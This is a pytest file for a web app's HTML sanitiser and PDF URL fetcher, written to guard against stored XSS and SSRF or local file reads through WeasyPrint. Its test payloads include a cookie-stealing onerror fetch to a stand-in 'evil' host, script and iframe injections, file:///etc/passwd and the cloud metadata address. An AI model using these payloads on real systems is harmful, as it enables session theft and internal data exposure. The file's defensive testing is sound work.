"""SEC-2 / SEC-3 — untrusted HTML reaching the published report and the PDF renderer.

`description` is stored as HTML and was the single field the HTML report
interpolated **raw** (every neighbour used `esc(...)`). The editor sanitises
client-side only, so `PUT /requirements/{id}` could persist anything.

The same unescaped markup was then handed to WeasyPrint with its *default*
fetcher, which registers file://, http://, https:// and ftp:// — turning an
`<img>` in a requirement into a server-side file read or an SSRF probe whose
result is rendered into the PDF the attacker downloads.
"""
import pytest

from app.services.sanitize import sanitize_html, safe_url_fetcher
from tests.conftest import make_req


class TestSanitiser:
    @pytest.mark.parametrize("payload", [
        "<img src=x onerror=fetch('https://evil/'+document.cookie)>",
        "<script>alert(1)</script>",
        '<iframe src="http://evil"></iframe>',
        "<style>body{background:url(http://evil)}</style>",
        "<svg><script>alert(1)</script></svg>",
        '<object data="http://evil"></object>',
        '<embed src="http://evil">',
    ])
    def test_active_content_is_removed(self, payload):
        out = sanitize_html(payload)
        for banned in ("<script", "<iframe", "<style", "<object", "<embed", "onerror", "<svg"):
            assert banned not in out.lower(), out

    @pytest.mark.parametrize("src", [
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
        "https://evil.example/pixel.png",
        "ftp://evil.example/x",
    ])
    def test_remote_and_local_image_sources_are_dropped(self, src):
        assert "<img" not in sanitize_html(f'<img src="{src}">')

    def test_inline_data_images_survive(self):
        out = sanitize_html('<img src="data:image/png;base64,iVBORw0KGgo=">')
        assert out.startswith("<img") and "data:image/png" in out

    def test_prose_and_formatting_survive(self):
        html = "<p>The system <strong>shall</strong> hold <em>8000</em> ft.</p><ul><li>a</li></ul>"
        assert sanitize_html(html) == html

    def test_attributes_are_stripped_but_text_kept(self):
        assert sanitize_html("<p onclick='steal()'>click</p>") == "<p>click</p>"

    def test_entities_are_preserved_not_double_escaped(self):
        assert sanitize_html("<p>a &lt; b &amp; c</p>") == "<p>a &lt; b &amp; c</p>"

    def test_malformed_markup_is_closed(self):
        assert sanitize_html("<p>unclosed <strong>bold") == "<p>unclosed <strong>bold</strong></p>"

    def test_is_idempotent(self):
        dirty = "<p>x<script>y</script><img src=z onerror=1></p>"
        once = sanitize_html(dirty)
        assert sanitize_html(once) == once


class TestWriteBoundary:
    def test_api_write_persists_sanitised_html(self, client, project):
        make_req(client, project, "REQ-001")
        res = client.put(
            f"/api/projects/{project}/requirements/REQ-001",
            json={"description": "<p>ok</p><img src=x onerror=alert(1)><script>bad()</script>"},
        )
        assert res.status_code == 200, res.text
        stored = res.json()["description"]
        assert "onerror" not in stored and "<script" not in stored
        assert "<p>ok</p>" in stored

    def test_create_is_also_sanitised(self, client, project):
        res = client.post(f"/api/projects/{project}/requirements",
                          json={"id": "REQ-900", "name": "x",
                                "description": "<script>bad()</script><p>fine</p>"})
        assert res.status_code == 201, res.text
        assert "<script" not in res.json()["description"]


class TestPublishedReport:
    def test_report_does_not_contain_the_payload(self, client, project):
        """Covers descriptions written *before* sanitisation existed, by
        writing straight to the store to bypass the model validator."""
        from app.core.dependencies import get_store
        make_req(client, project, "REQ-001", name="Cabin pressurisation")
        store = get_store(project)
        store.update_requirement("REQ-001", {
            "description": "<img src=x onerror=fetch('https://evil/')>"
                           "<script>alert(1)</script><p>Legitimate prose.</p>",
        })

        from app.services.publisher import Publisher
        # NB: the second positional arg is `subsystems`, not the project id —
        # passing one filters every requirement out and makes this test vacuous.
        html = Publisher(store).build_html()

        # Proves the requirement actually rendered, so the assertions below mean something.
        assert "Cabin pressurisation" in html
        assert "Legitimate prose." in html

        assert "onerror" not in html
        assert "<script>alert(1)</script>" not in html
        assert "fetch('https://evil/')" not in html


class TestPdfFetcher:
    def test_blocks_local_files_and_internal_addresses(self):
        fetch = safe_url_fetcher()
        for url in ("file:///etc/passwd",
                    "http://169.254.169.254/latest/meta-data/",
                    "https://evil.example/x.png"):
            with pytest.raises(ValueError):
                fetch(url)

    def test_allows_the_configured_logo_only(self):
        logo = "https://cdn.example/logo.png"
        fetch = safe_url_fetcher({logo})
        with pytest.raises(ValueError):
            fetch("https://cdn.example/other.png")
        # The allowlisted URL gets past the guard and on to the real fetcher
        # (which will fail on network, not on our check).
        try:
            fetch(logo)
        except ValueError as exc:
            pytest.fail(f"configured logo was blocked: {exc}")
        except Exception:
            pass  # network/DNS failure is fine — it passed the guard
